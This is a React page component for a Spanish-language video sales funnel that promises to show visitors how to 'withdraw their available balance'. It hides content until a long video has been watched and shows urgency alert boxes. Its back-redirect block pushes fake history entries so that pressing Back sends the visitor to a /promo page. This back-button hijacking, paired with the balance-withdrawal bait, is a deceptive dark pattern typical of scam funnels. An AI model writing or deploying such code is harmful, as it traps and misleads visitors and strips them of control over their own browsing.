import Comments from "@/components/Comments";
import VSLBlackV3 from "@/components/videos/VSLBlackV3";
import PixelV3 from "@/components/pixels/PixelV3";
import PlacesAlert from '@/components/PlacesAlert';
import AlertBoxUrgente from "@/components/AlertBoxUrgente";
import { useLayer } from '@/context/LayerProvider';
import { useEffect, useState } from 'react';

export default function Page6() {
  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const userLayer = useLayer();

  // USER LAYER DATA
  const userHost = userLayer.host;

  // SET CONTENT DATA
  const videoIdA = "682a850baace17974e9f7905"; // A
  const videoIdB = "682a850baace17974e9f7905"; // B - usando o mesmo ID temporariamente
  const backLink = `https://${userHost}/promo`;

  // VIDEO VERIFY
  useEffect(() => {
    if (!visible) {
      const intervalId = setInterval(() => {
        const storedTime = localStorage.getItem(videoIdA);
        const storedVideoTime = storedTime ? Number(storedTime) : 0;
        if (storedVideoTime > 850) {
          setVisible(true);
        }
      }, 1000);
      return () => clearInterval(intervalId);
    }
  }, [videoIdA, visible]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    }

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <>
      <PixelV3 />
      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
        <span className="text-base sm:text-2xl font-semibold tracking-tight">
          🚨 ¡ATENCIÓN! Mira el vídeo hasta el final para entender cómo retirar tu saldo disponible. ⬇️
        </span>
        <PlacesAlert />
      </div>
      <div className="flex items-center flex-col gap-8 relative -mt-4">
        <VSLBlackV3 />
        <AlertBoxUrgente
          videoIdA={videoIdA}
          videoIdB={videoIdB}
          thresholdASeconds={885}
          thresholdBSeconds={885}
        />
      </div>
      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Verifique si su sonido está activado
        </div>
      )}
      
      <Comments />
    </>
  );
}